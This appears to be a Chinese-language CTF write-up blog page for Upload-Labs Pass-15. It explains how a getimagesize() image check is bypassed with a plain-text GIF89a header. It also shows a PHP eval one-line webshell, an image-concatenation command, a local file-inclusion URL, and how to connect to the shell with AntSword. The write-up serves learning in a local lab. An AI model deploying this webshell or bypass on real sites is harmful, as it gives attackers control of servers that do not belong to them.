@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Upload-Labs】Pass-15 getimagesize 检测与文件包含 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Upload-Labs】Pass-15 getimagesize 检测与文件包含 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.11.03 | <strong>分类：</strong>CTF | <strong>标签：</strong>Upload-Labs, Web, 文件上传, getimagesize, 文件包含, WebShell</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Upload-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - 文件上传</li>
+        <li><strong>题目名称：</strong>Pass-15 (getimagesize 检测 + 文件包含)</li>
+        <li><strong>提示：</strong>服务端使用 <code>getimagesize()</code> 验证图片，必须绕过宽高结构检测，并利用 <code>include.php</code> 触发执行。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡源码通过 <code>getimagesize()</code> 获取图片信息，并利用 <code>image_type_to_extension()</code> 生成后缀名。该检测机制会解析文件结构（宽高），不能仅靠简单的文件头伪造。</p>
+    <p><strong>后缀名重命名的发现：</strong>在使用 CMD 将真实的 <code>.jpg</code> 图片与 PHP 代码拼接后上传，服务器返回的图片地址后缀变成了 <code>.jpeg</code>。这是因为 <code>image_type_to_extension()</code> 遇到 <code>IMAGETYPE_JPEG</code> 类型时，会统一将其转换为标准的 <code>.jpeg</code> 后缀。</p>
+    <p><strong>包含执行的问题：</strong>真实的 JPG 图片内部包含大量二进制乱码。当 <code>include.php</code> 尝试包含该文件时，PHP 引擎解析到乱码字符会导致语法崩溃（抛出 <code>Parse error</code>），从而无法执行尾部的木马代码。</p>
+
+    <h2>3. 工具配置与操作步骤</h2>
+    
+    <h3>工具配置：中国蚁剑</h3>
+    <ul>
+        <li><strong>URL 地址：</strong><code>http://127.0.0.1:8081/include.php?file=upload/真实文件名.gif</code></li>
+        <li><strong>连接密码：</strong><code>cmd</code>；<strong>编码：</strong>UTF-8。</li>
+    </ul>
+
+    <h3>操作步骤与解析：</h3>
+    
+    <p><strong>第一步：踩坑与验证（真实图片马）</strong></p>
+    <p>使用 CMD 命令 <code>copy /b 1.jpg + shell.php shell15.jpg</code> 拼接图片马并上传。获取真实路径时发现后缀被强制改为了 <code>.jpeg</code>。</p>
+    <p>访问 <code>include.php?file=upload/xxx.jpeg</code>，页面报 <code>Parse error</code>。证明虽然成功包含了文件，但图片内部的二进制数据导致 PHP 解析崩溃。</p>
+
+    <p><strong>第二步：构造纯文本 GIF 马（正确解法）</strong></p>
+    <p>为了绕过 <code>getimagesize()</code> 且避免二进制乱码导致解析崩溃，新建文本文档，写入纯文本格式的图片头与 Payload：</p>
+    <pre>GIF89a
+&lt;?php @eval($_POST['cmd']); ?&gt;</pre>
+    <p>保存为 <code>test15.gif</code>。</p>
+
+    <p><strong>第三步：上传与包含触发</strong></p>
+    <p>在网页上传 <code>test15.gif</code>。服务器识别文件头为 GIF，成功放行并保持 <code>.gif</code> 后缀。复制真实文件路径（如 <code>2026xxx.gif</code>）。</p>
+    <p>浏览器访问 <code>http://127.0.0.1:8081/include.php?file=upload/2026xxx.gif</code>，页面正常输出 <code>GIF89a</code>，无报错。</p>
+
+    <p><strong>第四步：蚁剑连接</strong></p>
+    <p>使用蚁剑，URL 填入上述包含地址，密码 <code>cmd</code>，成功连接并获取服务器权限。随后清理上传的文件。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>JPG 后缀被改为 JPEG：</strong>对于后缀被意外更改的情况，需明白这是由服务端的 <code>image_type_to_extension</code> 函数机制决定的。必须以复制出来的真实 URL 为准进行操作。</li>
+        <li><strong>二进制乱码导致包含失败：</strong>在利用文件包含执行图片马时，纯文本代码（如伪装的 <code>GIF89a</code>）的容错率远高于拼接的二进制真实图片。真实图片极易触发 PHP 的解析错误。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>getimagesize 校验绕过</strong>：理解函数仅校验文件头及宽高结构的特性，通过构建纯文本的 <code>GIF89a</code> 头部实现欺骗。</li>
+        <li><strong>文件包含的执行条件</strong>：包含的文件内容必须是符合 PHP 语法的纯文本，否则二进制数据会导致语法解析中断，致使 Payload 无法执行。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
